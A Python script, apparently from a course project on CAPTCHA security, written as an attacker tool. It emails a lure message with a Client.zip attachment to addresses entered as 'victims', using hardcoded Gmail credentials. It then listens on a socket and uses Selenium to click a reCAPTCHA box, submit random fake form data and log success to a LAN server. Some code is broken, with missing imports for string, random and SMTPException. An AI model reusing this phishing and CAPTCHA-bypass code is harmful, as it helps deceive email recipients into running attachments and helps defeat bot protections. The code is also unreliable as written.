import smtplib
import socket
import threading
import requests
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait

def generate_random_string():
	allowed_chars = ''.join((string.lowercase,string.uppercase))
	uniqueName = ''.join(random.choice(allowed_chars) for _ in range(8))
	return uniqueName

def generate_random_number():
	allowed_Numbers = ''.join((string.digits))
	uniqueID = ''.join(random.choice(allowed_Numbers) for _ in range (8))
	return uniqueID

def generate_random_emailID():
	allowed_chars = ''.join((string.lowercase))
	uniqueEmail = ''.join(random.choice(allowed_chars) for _ in range(6))
	uniqueEmailID = uniqueEmail + '@gmail.com'
	return uniqueEmailID
	
serverUrl = "http://192.168.0.20:8080"		# IP of machine on which server is hosted
driverPath = "D:/softwares/chromedriver_win32/chromedriver.exe" # Chrome Driver Location(it is provided in Attacker folder)
GMAIL_USERNAME = "gargut1994@gmail.com"    # Initialized the attacker's mail address
GMAIL_PASSWORD = "recaptcha"				# Stored the attacker's password
EMAIL_SUBJECT = "An Interesting opportunity to Grab A Grade in Computer & Network Security under Professor Traynor"
fileLocation = "Client.zip" # The Location of the Client Zip File
Recipient	= []
Victim_Status = []
no_of_Victims = input("Enter Number of Victims you want to target: ") 
no_of_Victims = int(no_of_Victims)

for x in range(0 , no_of_Victims):
	Recipient.append(input("Enter Victim Email Address :")) 

def autoclick_Page():
	print("Clicking the autopage")
	#WebDriver driver = new RemoteWebDriver("C:/Users/prateek13688/Downloads/chromedriver_win32", DesiredCapabilities.chrome())
	driver = webdriver.Chrome(driverPath) 
	url = serverUrl + "/Captcha/index.html"
	logurl = serverUrl + "/Captcha/logger"
	driver.get(url)
	driver.implicitly_wait(10)
	driver.switch_to_frame(driver.find_element_by_tag_name("iframe"))
	elem = driver.find_element_by_xpath("//span[@id= 'recaptcha-anchor']")
	elem1 = elem.find_element_by_class_name('recaptcha-checkbox-checkmark')
	elem1.click()
	print(elem1)
	driver.switch_to_default_content()
	print("Waiting for 10 sec")
	time.sleep(10)
	elem2 = driver.find_element_by_xpath("//table[@class= ' gc-bubbleDefault pls-container']")
	if elem2 is None:
		print(" The Captcha has been breached")
		time.sleep(10)
		name = generate_random_string()
		ufid = generate_random_number()
		emailID = generate_random_emailID()
		elem2 = driver.find_element_by_name("goahead")
		elem2.click()
		driver.implicitly_wait(10)
		eleName = driver.find_element_by_name("name")
		eleName.send_keys(name)
		eleUFID = driver.find_element_by_name("ufid")
		eleUFID.send_keys(ufid);
		elEmail = driver.find_element_by_name("email")
		elEmail.send_keys(emailID)
		eleCheckbox = driver.find_element_by_name("bot")
		eleCheckbox.click()
		elebutton = driver.find_element_by_name("dosubmit")
		elebutton.click()
		r = requests.post(logurl, data={'Status':'Success'})
		print(r.status_code, r.reason,r.content)
	else:
		print(" The Bot has been Caught")
		r = requests.post(logurl, data={'Status':'Failed'})
		print(r.status_code, r.reason,r.content)
	driver.close()
	
def connectto_Victim():
		print("Hello Thread Started")
		autoclick_Page()
		
# Creating Session to Send Automate Mails	
def createSocket_listen(port_number):
	print("Socket For Victim 1 Created")
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(("127.0.0.1", port_number))
	while True:
		sock.listen(1)
		var = 12;
		(ip, port) = sock.accept()
		print("The Connection Done", ip)
		#flagByte = sock.recv(512)
		#print(flagByte)
		thread = threading.Thread(target = connectto_Victim, args = ( ))
		thread.start()
	
def sendMail(Recipient):
	try:
		session = smtplib.SMTP('smtp.gmail.com', 587)
		session.ehlo()
		session.starttls()
		session.login(GMAIL_USERNAME, GMAIL_PASSWORD)
	except SMTPException:     
		print("Error Occured While Creating a Session With Gmail")
	
	for recp in Recipient:
		print(recp)	
		msg = MIMEMultipart('alternative')
		html = """\
		<html>
		<head></head>
		<body>
		<p>Hi!<br>
		How are you?<br>
		Download the zip file attached with this mail and read the README included in the zip file to install the software.
		</p>
		</body>
		</html>
		"""
		part1 = MIMEText(html,'html')
		msg['Subject'] = EMAIL_SUBJECT 
		msg['From'] = GMAIL_USERNAME
		msg['To'] = ', '.join(recp)
		part = MIMEBase('application', "octet-stream")
		part.set_payload(open(fileLocation, "rb").read())
		encoders.encode_base64(part)
		part.add_header('Content-Disposition', 'attachment', filename=fileLocation)
		msg.attach(part)
		msg.attach(part1)
		# Sending Mail
		try:
			session.sendmail(GMAIL_USERNAME, recp, msg.as_string())
			print("Mail Successfully Sent")
		except SMTPException:
			print("Mail Could not be delivered")
				
sendMail(Recipient)	
createSocket_listen(2346)